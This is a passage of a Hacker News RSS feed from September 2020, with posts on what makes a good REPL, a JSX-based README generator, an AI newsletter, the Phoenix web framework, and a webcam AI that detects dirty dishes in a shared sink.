            <link>https://eisaiah.blog/founder-friendly-standard-comparison/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588470</guid>
            <pubDate>Fri, 25 Sep 2020 10:41:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What makes a good REPL? (2017)]]>
            </title>
            <description>
<![CDATA[
Score 51 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24588453">thread link</a>) | @diggan
<br/>
September 25, 2020 | https://vvvvalvalval.github.io/posts/what-makes-a-good-repl.html | <a href="https://web.archive.org/web/*/https://vvvvalvalval.github.io/posts/what-makes-a-good-repl.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <ol><li><a href="#what_does_a_good_repl_give_you?">What does a good REPL give you?</a></li><ol><li><a href="#a_smooth_transition_from_manual_to_automated">A smooth transition from manual to automated</a></li><li><a href="#a_repl_lets_you_improvise">A REPL lets you improvise</a></li><li><a href="#a_repl_lets_you_write_fewer_tests,_faster">A REPL lets you write fewer tests, faster</a></li><li><a href="#a_repl_makes_you_write_accessible_code">A REPL makes you write accessible code</a></li></ol><li><a href="#what_makes_a_good_repl?">What makes a good REPL?</a></li><li><a href="#what_makes_a_programming_language_repl-friendly?">What makes a programming language REPL-friendly?</a></li><li><a href="#conclusion">Conclusion</a></li></ol>
    <p> <i>Dear Reader: although this post mentions Clojure as an example, it is not specifically about Clojure; please do not make it part of a language war. If you know other configurations which allow for a productive REPL experience, please describe them in the comments!</i></p><p> <img src="https://vvvvalvalval.github.io/img/repl.gif" width="100%"></p><p>Most comparisons I see of Clojure to other programming languages are in terms of its programming language <em>semantics</em>:  immutability, homoiconicity, data-orientation, dynamic typing, first-class functions, polymorphism '√† la carte'...  All of these are interesting and valuable features, but what actually gets me to <em>choose</em> Clojure for projects is its interactive  development story, enabled by <em>the REPL</em> (Read-Eval-Print Loop), which lets you evaluate Clojure expressions in an interactive  shell (including expressions which let you modify the state or behaviour of a running program).  </p><p>If you're not familiar with Clojure, you may be surprised that I describe the REPL as Clojure's most differentiating feature:   after all, most industrial programming languages come with REPLs or 'shells' these days (including Python, Ruby, Javascript, PHP, Scala,  Haskell, ...). However, I've never managed to reproduced the productive REPL workflow I had in Clojure with those languages;  the truth is that <strong>not all REPLs are created equal</strong>.</p><p>In this post, I'll try to describe what a 'good' REPL gives you, then list some technical characteristics which make some REPLs   qualify as 'good'. Finally, I'll try to reflect on what programming language features give REPLs the most leverage.</p><h2 id="what_does_a_good_repl_give_you?">What does a good REPL give you?</h2><p>The short answer is: by providing a <i>tight feedback loop</i>, and making your programs <i>tangible</i>,  a REPL helps you deliver programs with significantly higher productivity and quality.  If you're wondering why a tight feedback loop is important for creative activities such as programming, I recommend you watch  <a href="https://www.vimeo.com/36579366">this talk by Bret Victor</a>.</p><p>If you have no idea what REPL-based development looks like, I suggest you watch a few minutes of  <a href="https://vimeo.com/230220635" target="_blank">the following video</a>:</p><p><iframe src="https://player.vimeo.com/video/230220635" width="640" height="359" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p><p>Now, here's the long answer: <i>A good REPL gives you...</i></p><h3 id="a_smooth_transition_from_manual_to_automated">A smooth transition from manual to automated</h3><p>The vast majority of the programs we write essentially automate tasks that humans can do themselves.  Ideally, to automate a complex task, we should be able to break it down into smaller sub-tasks, then gradually automate each of the subtasks until reaching a fully-automated solution.  If you were to build a sophisticated machine like a computer from scratch, you would want to make sure you understand how the individual components work before putting them together, right?  Unfortunately, this is not what we get with the typical write/(compile)/run/watch-stdout workflow, in which we essentially put all the pieces together blindly and pray it works the first time we hit 'run'.  The story is different with a REPL: you will have played with each piece of code in isolation before running the whole program,  which makes you quite confident that each of the sub-tasks is well implemented.</p><p>This is also true in the other direction: when a fully-automated program breaks, in order to debug it,  you will want to re-play some of the sub-tasks manually.</p><p>Finally, not all programs need be fully automated - sometimes the middle ground between manual and automated is exactly what you want.  For instance, a REPL is a great environment to run ad hoc queries to your database, or perform ad hoc data analysis, while leveraging  all of the automated code you have already written for your project - much better than working with database clients, especially when  you need to query several data stores or reproduce advanced business logic to access the data.</p><p>How's life without a REPL? Here's a list of things that we do to cope with these issues when we don't have a REPL:</p><ul><li>Experiment with interactive tools such as cURL or database clients, then reproduce what we did in code.  Problem: you can't connect these in any way with your existing codebase. These tools are good at experimenting manually,  but then you have to code all the way to bridge the gap between making it work with these tools and having it work in your project.</li><li>Run scripts which call our codebase to print to standard output our files. Problem: you need to know exactly what to output before writing the script; you can't hold on to program state and <em>improvise</em> from there, as we'll discuss in the next section.</li><li>Use unit tests (possibly with auto-reloading), which have a number of limitations in this regard, as we'll see later in this post.</li></ul><h3 id="a_repl_lets_you_improvise">A REPL lets you improvise</h3><p>Software programming is primarily and <i>exploratory</i> activity.  If we had a precise idea of how our programs should work before writing them, we'd be <i>using</i> code, not writing it.</p><p>Therefore, we should be able to write our programs incrementally, one expression at a time, figuring out what to do next at each step,  <i>walking the machine through</i> our current thinking. This is simply not what the  compile/run-the-whole-thing/look-at-the-logs workflow gives you.</p><p>In particular, one situation where this ability is critical is fixing bugs in an emergency.  When you have to reproduce the problem, isolate the cause, simulate the fix and finally apply it, a REPL is often the  difference between minutes and hours.</p><p>Fun fact: maybe the most spectacular occurrence of this situation was the fixing of a bug  of the <a href="https://www.youtube.com/watch?v=_gZK0tW8EhQ">Deep Space 1</a> probe in 1999,  which fortunately happened to run a Common Lisp REPL while drifting off course several light-minutes away from Earth.</p><h3 id="a_repl_lets_you_write_fewer_tests,_faster">A REPL lets you write fewer tests, faster</h3><p>Automated tests are very useful for expressing what your code is supposed to do,  and giving you confidence that it works and keeps working correctly.</p><p>However, when I see some TDD codebases, it seems to me that a lot of unit tests are mostly here to make the code more tangible while developing, which is the same value proposition as using a REPL. However, using unit tests for this purpose comes with its lot of issues:</p><ol><li>Having too many unit tests makes your codebase harder to evolve. You ideally want to have as few tests as possible capture as many properties of your domain as possible.</li><li>Tests can only ever answer close-ended questions: "does this work?", but not "how does this work?", "what does this look like?" etc.</li><li>Tests typically won't run in real-world conditions: they'll use simple, artificial data and mocks of services such as databases or API clients. As a result, they don't typically help you understand a problem that only happens on real-life data, nor do they give you confidence that the real-life implementations of the services they emulate do work.</li></ol><p>So it seems to me a lot of unit tests get written for lack of a better solution for interactivity,  even though they don't really pull their weight as unit tests.  When you have a REPL, you can make the choice to only write the tests that matter.</p><p>What's more, the REPL <i>helps you</i> write these tests. Once you have explored from the REPL, you can just copy and paste  some of the REPL history to get both example data and expected output. You can even use the REPL to assist you in writing  the fixture data for your tests by generating it programmatically (everyone who has written comprehensive fixture datasets  by hand knows how tedious this can get). Finally, when writing the tests require implementing some non-trivial logic  (as is the case when doing Property-Based Testing), the productivity benefits of the REPL for writing code applies to writing tests as well.</p><p>Again, do <i>not</i> take from this that a REPL is a replacements for tests. Please do write tests, and let the REPL help you  write the right tests effectively.</p><h3 id="a_repl_makes_you_write_accessible_code">A REPL makes you write accessible code</h3><p>A REPL-based workflow encourages you to write programs which manipulate values that are <strong><i>easy to fabricate.</i></strong>  If you need to set up a complex graph of objects before you can make a single method call, you won't be very inclined to use the REPL.  </p><p>As a result, you'll tend to write <strong><i>accessible code</i></strong> - with few dependencies, little environmental coupling, high modularity,   and tangible inputs and outputs.  This is likely to make your code more clear, easy to test, and easy to debug.  </p><p>To be clear, this <i>is</i> an additional constraint on your code (it requires some upfront thinking to make your code REPL-friendly,  just likes it requires some upfront thinking to make your code easy to test) - but I believe it's a very beneficial constraint.  When my car engine breaks, I'm glad I can just lift the hood and access all the parts - and making this possible  has certainly put more work on the plate of car designers.</p><p>Another way a REPL makes code more accessible is that it makes it easier to learn, by providing a rich playground for beginners to experiment.  This applies to both learning languages and onboarding existing projects.</p><h2 id="what_makes_a_good_repl?">What makes a good REPL?</h2><p>As I said above, not all REPLs give you the same power.  Having experimented with REPLs in various configurations of language and tooling,  this is the list of the main things I believe a REPL should enable you to do to give you the most leverage:</p><ol><li><strong>Defining new behaviour / modify existing behaviour.</strong> For instance, in a procedural language, this means defining new functions, and modify the implementation of existing functions.</li><li><strong>Saving state in-memory.</strong> If you can't hold on to the data you manipulate, you will waster a ton of effort re-obtaining it - it's like doing your paperwork without a desk.</li><li><strong>Outputting values which can easily be translated to code.</strong> This means that the textual representation the REPL outputs is suitable for being embedded in code.</li><li><strong>Giving you access to your whole project code.</strong> You should be able to call any piece of code written in your project of its dependencies. As an execution ‚Ä¶</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vvvvalvalval.github.io/posts/what-makes-a-good-repl.html">https://vvvvalvalval.github.io/posts/what-makes-a-good-repl.html</a></em></p>]]>
            </description>
            <link>https://vvvvalvalval.github.io/posts/what-makes-a-good-repl.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588453</guid>
            <pubDate>Fri, 25 Sep 2020 10:38:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Automatically generating README files with JSX]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588281">thread link</a>) | @dbartholomae
<br/>
September 25, 2020 | https://startup-cto.net/automatically-generating-readme-files-with-jsx-readme/ | <a href="https://web.archive.org/web/*/https://startup-cto.net/automatically-generating-readme-files-with-jsx-readme/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        


        <span><time datetime="2020-09-24">24 Sep 2020</time> </span>

        

        <section>
            <!--kg-card-begin: markdown--><p>It's the first thing that greets you when you look at an npm package, be it on npm itself or in the source on GitHub: The README.md file. But if you are like me, then writing documentation never was your strong suite - let alone maintaining and updating it.</p>
<p>What if, instead of having to update the README file manually whenever your code changes, the README could just stay up-to-date auto-magically? What if instead of having to remember which badges you need to add, this would all be done for you?</p>
<h2 id="introducingjsxreadme">Introducing jsx-readme</h2>
<p>Here's an example of using <code>jsx-readme</code>:</p>
<pre><code>// We need to tell the JSX transpiler that in this file,
// instead of React we use the custom createElement and Fragment
// functions from jsx-readme
/* @jsx MD */
/* @jsxFrag Fragment */
import type { Component } from "jsx-readme";
import MD, {
  BadgesFromPkg,
  CodecovBadge,
  DescriptionFromPkg,
  ExamplesFromPkg,
  Fragment,
  GithubWorkflowBadge,
  HomepageFromPkg,
  renderToFile,
  TitleFromPkg,
} from "jsx-readme";
import { Heading, InlineCode, LineBreak } from "jsx-md";
import pkg from "./package.json";

const Readme: Component = () =&gt; (
  &lt;Fragment&gt;
    {/* Create a header with title, badges and description inferred from package.json */}
    &lt;TitleFromPkg pkg={pkg} /&gt;
    &lt;BadgesFromPkg pkg={pkg} /&gt;
    {/* Add additional badges. */}
    &lt;CodecovBadge pkg={pkg} /&gt;
    &lt;GithubWorkflowBadge pkg={pkg} workflowName="Build and deploy" /&gt;
    &lt;LineBreak /&gt;
    &lt;DescriptionFromPkg pkg={pkg} /&gt;
    {/* You can use the components from jsx-md to build custom markdown. */}
    &lt;Heading level={2}&gt;Installation&lt;/Heading&gt;
    Add &lt;InlineCode&gt;jsx-readme&lt;/InlineCode&gt; to your{" "}
    &lt;InlineCode&gt;devDependencies&lt;/InlineCode&gt; and install it. I recommend using
    it with &lt;InlineCode&gt;ts-node&lt;/InlineCode&gt;. Then all you need to do is add a
    file like in the example below and run it via{" "}
    &lt;InlineCode&gt;ts-node&lt;/InlineCode&gt; whenever you want to create a new version
    of the &lt;InlineCode&gt;README&lt;/InlineCode&gt;.
    &lt;LineBreak /&gt;
    &lt;LineBreak /&gt;
    {/* Create an example section based on all files from the example directory set up in package.json */}
    &lt;ExamplesFromPkg pkg={pkg} /&gt;
    {/* Create a section linking to the homepage from package.json */}
    &lt;HomepageFromPkg pkg={pkg} /&gt;
  &lt;/Fragment&gt;
);

void renderToFile("./README.md", &lt;Readme /&gt;);
</code></pre>
<p>As you can see, <code>jsx-readme</code> uses a React-like JSX syntax to define Markdown. It is built on top of <code>jsx-md</code> which you can also use independently, or together with <code>jsx-readme</code>, depending on your needs.</p>
<p>Since JSX is basically JavaScript, we can do in this file whatever we want. In this simple case we just import the local <code>package.json</code> file to read from it, but why not e. g. query the GitHub API to figure out who contributed and then adding them to your Readme?</p>
<p>And since it is just a TypeScript file, you can simply run it via e. g. <code>ts-node</code> instead of having to learn yet another CLI tool.</p>
<h2 id="sowhatdoesitlooklike">So what does it look like?</h2>
<p>The best way to understand the result of the script above is to just look at <a href="https://github.com/dbartholomae/jsx-readme/">the package itself</a> - <code>jsx-readme</code> uses it to create its own README.</p>
<!--kg-card-end: markdown-->
        </section>

        


    </article>

</div></div>]]>
            </description>
            <link>https://startup-cto.net/automatically-generating-readme-files-with-jsx-readme/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588281</guid>
            <pubDate>Fri, 25 Sep 2020 09:57:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I write a free weekly newsletter featuring curated AI news, articles and jobs.]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588181">thread link</a>) | @dominikposmyk
<br/>
September 25, 2020 | https://www.quickchat.ai/newsletter | <a href="https://web.archive.org/web/*/https://www.quickchat.ai/newsletter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!-- <div class="col-12 col-sm-7" style="display: flex; padding-top: 40px; padding-bottom: 40px"> -->
      <div>
        <div>
          
          <h2>A free weekly newsletter featuring curated news, articles, essays, job offers, Tweets and open source projects related to artificial intelligence ü§ñ, machine learning ‚öôÔ∏è and data science üë©‚Äçüî¨.</h2>
          <p><a href="https://itemsy.com/quickchat" target="_blank">Let me read it first &gt;</a></p>
          
          <p>
            <span>Curated by</span>
            <a href="https://quickchat.ai/"><img src="https://www.quickchat.ai/img/logo_color.png"></a>
          </p>
        </div>
      </div>
      <!-- <div class="col-12 col-sm-5" style="display: flex">
        <img src="img/newsletter.jpg" style="width: 100%; margin: auto" />
      </div> -->
    </div></div>]]>
            </description>
            <link>https://www.quickchat.ai/newsletter</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588181</guid>
            <pubDate>Fri, 25 Sep 2020 09:40:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things Elixir's Phoenix Framework Does Right]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588122">thread link</a>) | @dinomad
<br/>
September 25, 2020 | https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/ | <a href="https://web.archive.org/web/*/https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="container"><div><article itemscope="" itemtype="http://schema.org/BlogPosting"><div itemprop="articleBody"><p>I dabbled in Phoenix for a while now, but never <em>really</em> got my hands dirty with it right up until now. Apart from the whole framework being surprisingly well thought through, there are a few things that strike me as being done <em>exceptionally</em> well in Phoenix, compared to the rest of modern web frameworks.</p><p><img src="https://scorpil.com/img/phoenix.png" alt="Phoenix Framework Logo"></p><h3 id="1-striking-a-balance-between-flexibility-and-strictness">1. Striking a balance between flexibility and strictness</h3><p>Modern web frameworks can be roughly divided into two camps:</p><ul><li>Flexible ‚ÄúDIY‚Äù frameworks are a little more than a set of utilities for the most common web-related tasks. Most Go frameworks are like this, as well as ExpressJS. They enforce little to no rules for the structure of your applications and rely on the community to come up with the extensions and best practices. As a result, they are very flexible; those with a large community have extensions to perform any task imaginable. On the flip side, apps built on such a foundation can, given poor governance, slowly evolve into an unsupportable mess of incompatible plugins and mismatched coding styles.</li><li>Strict ‚Äúbatteries included‚Äù frameworks bring with them a complete set of tools to perform common web development tasks, as well as a set of conventions to go with it. They guide the developer into optimal code structure and typically strive to provide a single favored way of doing things. Of course, these kinds of frameworks are also extendable, but built-in tools often get embedded so deep into the project that they are almost irreplaceable. In this category, the most popular examples are Django and Ruby on Rails.</li></ul><p>Of course, most frameworks are not on an extreme end of the scale, but the distinction is there. Worth noting that neither group is strictly better than the other ‚Äì each has its usecases.</p><p>Phoenix Framework, in my mind, holds very close to the middle of this scale for these reasons:</p><ul><li>it builds upon Elixir‚Äôs functional philosophy, so it has a very clear idea how things <em>should</em> work (single request context passed around as the first argument to all components that participate in a response generation, avoiding side effects where possible, MVC-inspired architecture, etc.)</li><li>it does not hide its internal details in a ‚Äúblack box‚Äù, quite the opposite - it encourages you to understand internal conventions to write your own code in the same fashion. When you get comfortable using a framework, you can probably read its code without too much trouble.</li><li>by default Phoenix comes with a huge pack of tools and utils (ORM, routing, test suit, HTML rendering, metrics dashboard (sic!)‚Ä¶), but in most cases, there‚Äôs a trivial way to swap them out or turn them off.</li></ul><h3 id="2-reactiveness">2. Reactiveness</h3><p>When an app requires bi-directional communication between client and server, you usually either
integrate a 3rd party library into the framework, which means writing a pile of glue code, or
use a specialized framework like Tornado, which (caution, personal opinion here) kind of an awkward choice for those parts of the web app that do not concern themselves with WebSockets.</p><p>Phoenix is great for classical HTTP, but persistent communication is where it <em>really</em> shines. Primitives it gives you with channels, PubSub and Presence are just enough to avoid boilerplate without sacrificing flexibility. Recent live view release is a whole new way of building dynamic apps. I wouldn‚Äôt go as far as to call it revolutionary, but it is definitely an intriguing attempt of bridging the gap between frontend and backend.</p><h3 id="3-performance">3. Performance</h3><p>Phoenix‚Äôs performance has surprisingly little to do with the framework itself. It inherited its impressive concurrence characteristics from Elixir, which got it from Erlang, which got it thanks to the primitives of the BEAM virtual machine and the architectural patterns of OTP. The main principle at work to achieve concurrency is to schedule lightweight threads of execution to run each independent piece of work concurrently. You might have seen this approach in other languages (goroutines, python‚Äôs greenlets, etc.), that‚Äôs because it works great to organize concurrent code execution without performance hit and with a minimal headache for a developer. However, BEAM gives this concept support on a VM level, which means it can be optimized even on a hardware level.</p><p>While lightweight processes help you perform well on your IO-bound tasks, Elixir being a compiled language means that CPU bound tasks won‚Äôt bottleneck easily as well, and perform on less computing resources than most alternatives. While I can‚Äôt be 100% sure that it will be faster for your application than Go or Rust in terms of CPU usage, I‚Äôm reasonably sure that it will be more than fast enough in a context of a typical web app.</p><p><em><strong>Update:</strong> correction based on discussion in here and on other platforms: Elixir is slower than Go/Rust on purely CPU-bound tasks, mainly because BEAM interrupts running threads for task scheduling. Also, Elixir/Erlang compiles to bytecode, not directly to the machine code (although BeamAsm, JIT compiler for Erlang‚Äôs VM, has <a href="https://github.com/erlang/otp/pull/2745">landed in master 4 days ago</a>, so this should change in the next OTP release).</em></p><h3 id="4-failure-tolerance-and-cluster-awareness">4. Failure tolerance and cluster-awareness</h3><p>You might have heard Phoenix being called a ‚Äúmonolithic framework‚Äù. This is true to some extent: Phoenix <em>does</em> encourage you to put your frontend, backend, and background tasks in the same app. However, it also provides facilities to ensure that failure in a single component of the app will not affect other independent components. To explain in short, the app is divided into processes that communicate with each other via kind-of event messages. Each component is supervised, the supervisor will catch unhandled failures and restart the process in an attempt to fix them. It‚Äôs somewhat reminiscent of a microservice architecture, just on a lower level.</p><p>Unlike most frameworks, Phoenix understands that it will most likely run on more than one node. It provides a way to communicate over the network in exactly the same way you communicate between the processes within your app.</p><p>This does not mean that Phoenix is a bad choice for microservices, it just means that framework itself can handle some of the same concerns microservices are designed to handle. A smaller app might benefit from that by avoiding some of the complexities of building up your own microservices architecture. Bigger apps, and those that are already built as microservices, can still incorporate Phoenix effectively.</p><h3 id="are-there-any-drawbacks">Are there any drawbacks?</h3><p>Elixir, and functional programming in general, is still a long way away from the mainstream. If you don‚Äôt know your way around closures, immutable data structures, and functional thinking it will take you a while before getting to feel comfortable with Phoenix. The good news is that functional programming is on an upwards trend, and with applications growing more parallel and distributed, I don‚Äôt think this trend will reverse any time soon. So the knowledge you acquire in the process will serve you well going forward, independent from what the future holds for Phoenix.</p><p>The included tooling is great, but you might miss some 3rd party SDK‚Äôs when you need them. That‚Äôs definitely something to consider when starting a project. To give you an example: <a href="https://aws.amazon.com/getting-started/tools-sdks/">AWS</a> at the time of writing does not provide an official elixir client library.</p><p>Phoenix Framework a rock-solid, production-ready tool with a variety of usecases. It feels fresh and well thought through. I won‚Äôt be surprised if Phoenixes popularity continues to grow to reach the level of ‚ÄûTop tier‚Äú frameworks in the next few years.</p></div></article></div></div></div></div>]]>
            </description>
            <link>https://scorpil.com/post/things-elixirs-phoenix-framework-does-right/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588122</guid>
            <pubDate>Fri, 25 Sep 2020 09:29:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dish-O-TRON ‚Äì No more dirty dishes thanks to AI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588115">thread link</a>) | @dkupfer1
<br/>
September 25, 2020 | https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/ | <a href="https://web.archive.org/web/*/https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Thanks for clicking our click-baity title. Sadly, to tell you the truth, doing dishes is still a thing. However, so far most of our readers still like our non-standard Deep Learning tutorial.</em></p><p>Typically, AI is demonstrated as solving various toy problems. AI plays chess and Go, AI plays video games, AI makes people dance. It is time to stop this madness and finally apply AI in a meaningful way. Therefore, we proudly present the dish-o-tron. The dish-o-tron is an AI system designed to solve an actual real-world problem impacting millions of people around the world every day: facing dirty dishes in the community kitchen sink.</p><div id="attachment_77683"><p><a href="https://blog.codecentric.de/files/2020/09/real_world_problem.png"><img aria-describedby="caption-attachment-77683" loading="lazy" src="https://blog.codecentric.de/files/2020/09/real_world_problem-250x107.png" alt="dirty dishes in the community kitchen sink" width="250" height="107" srcset="https://blog.codecentric.de/files/2020/09/real_world_problem-250x107.png 250w, https://blog.codecentric.de/files/2020/09/real_world_problem-700x300.png 700w, https://blog.codecentric.de/files/2020/09/real_world_problem-768x329.png 768w, https://blog.codecentric.de/files/2020/09/real_world_problem-1536x659.png 1536w, https://blog.codecentric.de/files/2020/09/real_world_problem-120x51.png 120w, https://blog.codecentric.de/files/2020/09/real_world_problem.png 1600w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77683">dirty dishes in the community kitchen sink ‚Äì a real-world problem</p></div><p>Reading this blog series will equip you with the ultimate power to solve this long-lasting problem in your community kitchen once and for all by using state-of-the-art AI technology.</p><h2>The dish-o-tron</h2><p>At first glance, the dish-o-tron is an inconspicuous, well-positioned webcam in the kitchen observing the shared kitchen sink. In its natural state the dish-o-tron is just happy and enjoys life. The dish-o-tron doesn‚Äôt care whether you prefer tea or coffee and it likes all kinds of kitchen talk. However, there is one single thing that the dish-o-tron absolutely hates: watching someone put dirty dishes in the community sink.</p><p>Detecting dirty dishes in the sink enrages the peace-loving dish-o-tron so much that it starts beeping. The only way to return it to its natural peaceful state and thus stopping the noise is to admit one‚Äôs mistake and remove all dirty dishes from the community sink, leaving it neat and clean again.</p><p>Building the dish-o-tron requires three high-level steps:</p><ul><li>Gathering and preparing data</li><li>Training an AI model</li><li>Deployment of the model</li></ul><p>In the following, we will discuss these steps further.</p><h2>Gathering and preparing data</h2><p>Trying to solve real-world problems with AI often starts with the realisation that there is little or even no data available. This issue prevents many problem solvers from actually solving the problem. ‚ÄúIf only data collection had started years ago!‚Äù, they say, ‚Äúthen we could now actually solve the problem‚Äù. While this is a reasonable thought, it simply doesn‚Äôt help.</p><p>Consoling users currently facing a problem by saying that it is necessary to gather lots of data for quite some time before we can start building a solution is at least challenging. Typically a more promising approach is to build a system addressing the problem which is able to improve over time.</p><p>In this way, we will not solve the problem completely in the first step; however, we will tackle the problem right away and put ourselves in a position to iteratively adjust the solution to match the requirements which also become more and more clear while working on the problem.</p><p>Since our problem is unique in a sense that there is no Kaggle dataset readily available, we start our journey to building the dish-o-tron by doing our best to collect a suitable dataset for a first working system. Here, we will make videos of various kitchen sinks clean and not clean and split them up into a first labeled dataset.</p><p>In this way, we started collecting the DIRTY-DISHES-DATASET with thousands of pictures that we will share with you in the next article.</p><div id="attachment_77687"><p><a href="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset.png"><img aria-describedby="caption-attachment-77687" loading="lazy" src="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-250x151.png" alt="sample images from the dirty-dishes dataset" width="250" height="151" srcset="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-250x151.png 250w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-700x424.png 700w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-768x465.png 768w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-120x73.png 120w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset.png 1004w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77687">sample images from the dirty-dishes dataset</p></div><h2>Training an AI model</h2><p>Not so long ago, training an AI model was tedious and required expert knowledge. In many cases this is still true today. Depending on the problem, we have to figure out a suitable model architecture and feature engineering and this requires some experimentation before we can train a suitable AI model. This is another issue which prevents problem solvers from building a solution tackling the whole problem even if data is available.</p><p>Fortunately, image classification is one of the best understood use cases in AI. There are lots of established best practices regarding model architectures and training of models. Among others this led to two things:</p><ul><li>High-level software libraries such as fast.ai which abstract away lots of the nitty-gritty details of image classification, providing a black-box kind of approach where state-of-the-art practises are simply utilised without burdening the user with the details.</li><li>Machine Learning as a service offerings from various public cloud providers such as automl and rekognition allowing training of image classification models on custom data in a few simple steps.</li></ul><p>Both approaches will typically not lead to the absolutely best solution. However, most of the time this is not necessary and ‚Äògood enough‚Äô will be just fine and a nice trade-off between time money spent vs. result. For our first version of the dish-o-tron, we will employ the <a href="https://cloud.google.com/automl" target="_blank" rel="noopener noreferrer">AutoML Service</a> from Google Cloud to train a first model.</p><p>We can use various tools to inspect the model and try to explain if the black box learns what we expect.</p><div id="attachment_77689"><p><a href="https://blog.codecentric.de/files/2020/09/explain_model.png"><img aria-describedby="caption-attachment-77689" loading="lazy" src="https://blog.codecentric.de/files/2020/09/explain_model-250x191.png" alt="visualizing what the dish-o-tron model has actually learned" width="250" height="191" srcset="https://blog.codecentric.de/files/2020/09/explain_model-250x191.png 250w, https://blog.codecentric.de/files/2020/09/explain_model-700x535.png 700w, https://blog.codecentric.de/files/2020/09/explain_model-768x587.png 768w, https://blog.codecentric.de/files/2020/09/explain_model-120x92.png 120w, https://blog.codecentric.de/files/2020/09/explain_model.png 1412w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77689">Visualizing what the model has actually learned.</p></div><p>The training of the AI model with AutoML and its technical details will be discussed in a follow-up blog post.</p><h2>Deployment of the model</h2><p>Having an AI model generally will not solve an actual real-life problem. For a viable solution, the AI model has to be integrated into a suitable context. Many times, this is the key step to generating any value at all. Nevertheless, this step is often postponed to the distant future after ‚Äúcollecting high quality data‚Äù and ‚Äúbuilding the best AI model‚Äù. This is, more often than not, a mistake because integrating the model into its context poses various challenges on its own. Hence, it should not be ignored and instead tackled early in order to learn and identify the associated challenges.</p><p>While building the dish-o-tron, we tried multiple options to run the model. We deployed it on a Pi Zero which is a really small and cheap device that can be glued anywhere with a small powerbank. But it is rather slow. We ran the model in the browser using our notebook‚Äôs webcam with TensorFlow.js. We used the Google AIY Kit, which is much faster than the Pi Zero and also comes with a beeper and blinking lights (but it is quite old and deploying state-of-the-art models is hacky). Finally, we used the Google Coral device, which is made for this kind of workload and well-integrated into Google AutoML but comes with a price tag.</p><p>The community kitchen is a special place. It‚Äôs a place where rumors are born, where gossip is produced and where you can openly chat about the most secret secrets of your company! That‚Äôs why dish-o-tron is living on the edge. Edge devices enable you to run audio and video analytics AND respect the privacy of your community kitchen. No image is transferred to the cloud. Nothing is saved. Dish-o-tron sees and forgets.</p><div id="attachment_77691"><p><a href="https://blog.codecentric.de/files/2020/09/various_edge_devices.png"><img aria-describedby="caption-attachment-77691" loading="lazy" src="https://blog.codecentric.de/files/2020/09/various_edge_devices-250x85.png" alt="various edge devices" width="250" height="85" srcset="https://blog.codecentric.de/files/2020/09/various_edge_devices-250x85.png 250w, https://blog.codecentric.de/files/2020/09/various_edge_devices-700x237.png 700w, https://blog.codecentric.de/files/2020/09/various_edge_devices-768x261.png 768w, https://blog.codecentric.de/files/2020/09/various_edge_devices-1536x521.png 1536w, https://blog.codecentric.de/files/2020/09/various_edge_devices-2048x695.png 2048w, https://blog.codecentric.de/files/2020/09/various_edge_devices-120x41.png 120w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77691">Various edge devices</p></div><p>Moreover, the hardware we consider and buy in order to actually build the dish-o-tron will establish basic conditions for our solution space. In other words, we have to mind that it is possible to painlessly deploy the AI model on our preferred edge device. For the first version of the dish-o-tron, we decided to use a Google AIY kit (see video below). For the next version, we chose a Google Coral edge device, which allows us to run advanced computer vision tasks on a Raspberry-size mini computer. Fortunately, AutoML allows us to export models in a viable format.</p><div id="attachment_77693"><p><a href="https://blog.codecentric.de/files/2020/09/google_coral_device.png"><img aria-describedby="caption-attachment-77693" loading="lazy" src="https://blog.codecentric.de/files/2020/09/google_coral_device-250x131.png" alt="Google coral device" width="250" height="131" srcset="https://blog.codecentric.de/files/2020/09/google_coral_device-250x131.png 250w, https://blog.codecentric.de/files/2020/09/google_coral_device-700x366.png 700w, https://blog.codecentric.de/files/2020/09/google_coral_device-768x401.png 768w, https://blog.codecentric.de/files/2020/09/google_coral_device-1536x803.png 1536w, https://blog.codecentric.de/files/2020/09/google_coral_device-120x63.png 120w, 